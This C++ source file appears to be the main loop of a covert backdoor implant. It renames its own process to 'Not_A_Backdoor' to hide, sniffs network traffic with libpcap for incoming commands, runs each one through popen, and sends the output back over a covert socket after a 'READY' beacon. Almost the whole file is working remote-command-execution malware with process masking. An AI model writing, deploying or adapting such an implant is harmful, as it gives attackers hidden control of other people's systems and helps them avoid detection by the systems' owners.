#include <iostream>
#include <cstring>
#include <sys/prctl.h>
#include <signal.h>
#include <csignal>
#include <pcap.h>
#include "NetworkMonitor.h"
#include "CovertSocket.h"
#include "../utils/Logger.h"

#define newProcessName "Not_A_Backdoor"

pcap_if_t * allInterfaces = nullptr;
pcap_if_t * listeningInterface = nullptr;

bool keepListening = true;

NetworkMonitor * monitor = nullptr;

void shutdownServer(int signo){
    cout << "Terminating Program" << endl;

    keepListening = false;
    monitor->killListening();

}

bool getInterface(){

    Logger::debug("Main:getInterfaces - Initializing");

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t * interfaces;
    pcap_if_t * interface;

    Logger::debug("Main:getInterfaces - Finding All Interfaces");

    if(pcap_findalldevs(&interfaces, errbuf) == -1){
        Logger::error("Main:getInterfaces - There Was An Error Fetching The Interfaces");
        cerr << errbuf << endl;
        return false;
    }

    Logger::debug("Main:getInterfaces - Looping Through All Interfaces") ;

    allInterfaces = interfaces;
    interface = interfaces;
    while(interface != NULL){
        const char * name = interface->name;

        Logger::debug("Main:getInterfaces - Testing Interface With Name: " + string(name));

        if(strcmp(name, string("lo").c_str()) == 0){
            //this is the any interface
            Logger::debug("Main:getInterfaces - FOUND THE ANY INTERFACE");

            listeningInterface = interface;
            return true;
        }

        interface = interface->next;
    }

    return false;
}

string executeCommand(string command){

    Logger::debug("Setting Up Variables To Execute Command");

    //append redirects to the command
    command = command + " 2>&1";
    string response = ""; // storage for response
    const int BUFFERSIZE = 2048;
    char BUFFER[BUFFERSIZE];
    memset(BUFFER, 0 , sizeof(BUFFER));
    FILE *fp;

    Logger::debug("Command At This Point Is: >" + command + "<");


    if((fp = popen(command.c_str(), "r")) == NULL){
        Logger::error("Main:executeCommand - There Was An Error Executing The Command");
        response += "[ERROR EXECUTING COMMAND] ";
    }

    Logger::debug("Command Has Been Executed. Response At This Pont Is: >" + response + "<");

    while(fgets(BUFFER, sizeof(BUFFER), fp) != NULL){

        char tmp[BUFFERSIZE];
        strcpy(tmp, BUFFER);

        string responseLine = string(tmp);

        Logger::debug("ResponseLine Is: " + responseLine);

        response += responseLine;

        Logger::debug("Total Response At This Time Is: >" + response + "<");

        //refresh the buffer;
        memset(BUFFER, 0 , sizeof(BUFFER));
    }

    Logger::debug("Done Looping. Total Response At This Time Is: >" + response + "<");
    Logger::debug("Closing popen");

    if(pclose(fp)){
        Logger::error("Main:executeCommand - There Was An Error Executing The Command Or Command Exited With Error Status");
        response += " [ERROR EXECUTING COMMAND OR COMMAND EXITED WITH ERROR STATUS]";
    }

    Logger::debug("popen Close Complete. Response At this Time Is: >" + response + "<");

    return response;

}

int main(int argc, char * argv[]) {

    Logger::setDebug(true);

    Logger::debug("Starting Program");

    //mask the program
    memset(argv[0], 0, strlen(argv[0]));
    strcpy(argv[0], newProcessName);
    prctl(PR_SET_NAME, newProcessName, 0,0);

    Logger::debug("Masking Complete");

    //register listening for kill commands. when killed we destroy ourselves
    struct sigaction act;
    act.sa_handler = shutdownServer;
    act.sa_flags = 0;
    if(sigemptyset(&act.sa_mask) == -1 || sigaction(SIGINT, &act, NULL) == -1){
        perror("Failed to Set SIGNINT Handler");
        return 1;
    }

    Logger::debug("Registering Signal");

    //find listening items
    if(getInterface() == false){
        Logger::error("Main - There was An Error Reading The Interfaces");
        return 1;
    }else{
        Logger::debug("Finding Interface Successful");
    }

    Logger::debug("Finding Interfaces");


    TrafficAnalyzer * trafficAnalyzer = TrafficAnalyzer::getInstance();
    //start monitoring for UDP traffic. If it is our own, it needs handling, if not, add it to traffic analyzer
    CovertSocket * socket = CovertSocket::getInstance(); //how we respond to commands
    monitor = NetworkMonitor::getInstance(); //how we listen for commands

    //ET PHONE HOME
    socket->send("READY");

    while(keepListening){

        string command = monitor->listenForTraffic(listeningInterface); //this will hang until a single unit of data is received and then return it

        if(strcmp(command.c_str(), "-1")==0){
            shutdownServer(0);
        }

        if(keepListening == false){
            break;
        }

        string response = executeCommand(command);

        if(keepListening == false){
            break;
        }

        socket->send(response);
    }


    Logger::debug("Loop Killed. Terminating");

    Logger::debug("Freeing All ResourceS");
    pcap_freealldevs(allInterfaces);
    allInterfaces = nullptr;
    listeningInterface = nullptr;

    delete(socket);
    delete(monitor);

    socket = nullptr;
    monitor = nullptr;

    return 0;
}